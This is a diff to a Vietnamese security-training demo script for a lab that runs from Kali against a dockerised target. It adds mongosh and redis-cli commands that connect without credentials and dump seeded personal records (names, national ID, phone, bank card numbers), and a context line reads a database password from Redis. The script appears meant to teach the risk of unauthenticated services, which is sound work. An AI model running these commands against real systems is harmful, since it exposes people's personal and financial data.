@@ -118,6 +118,21 @@ redis-cli -h $T GET app:db:password
 **Bản chất:** script NSE gửi lệnh của **chính giao thức** — Mongo `buildInfo`, Redis `INFO`. Server trả lời mà không đòi credential = chưa bật auth.
 **Nói:** "Vào thẳng Mongo, đọc được key trong Redis — không cần một mật khẩu nào."
 
+**Khám phá dữ liệu thật từ Kali** (như một admin, dù không có tài khoản):
+```bash
+mongosh "mongodb://$T:27017"          # phiên tương tác:
+#   show dbs · use hocvien · show collections · db.hoc_vien.countDocuments() · db.hoc_vien.findOne()
+# hoặc một dòng — chiếu 5 bản ghi PII cho lớp:
+mongosh "mongodb://$T:27017" --quiet --eval \
+ 'db.getSiblingDB("hocvien").hoc_vien.find({},{ho_ten:1,cccd:1,so_dien_thoai:1,the_ngan_hang:1,_id:0}).limit(5)'
+redis-cli -h $T KEYS 'hv:*' | head    # các key chứa PII trong Redis
+```
+> `mongosh` KHÔNG có trong repo Kali (repo riêng của MongoDB). Kali thiếu thì chạy trên target:
+> `docker exec -i lab-mongo mongosh --quiet --eval 'db.getSiblingDB("hocvien").hoc_vien.findOne()'`
+> Dữ liệu Mongo/Redis do `bash data/seed/seed_all.sh` nạp (chạy trên target sau `docker compose up`).
+
+**Nói (money shot):** "Tôi đang ở Kali, không có tài khoản gì trên hệ thống này. `show dbs` thấy toàn bộ database; `findOne` ra một học viên thật với CCCD và số thẻ ngân hàng — chỉ vì Mongo bind `0.0.0.0` và không bật `--auth` (GT-D01)."
+
 ## 2. At rest — bucket public rò PII ⭐ (money shot)
 **Lệnh** `[Kali]`
 ```bash
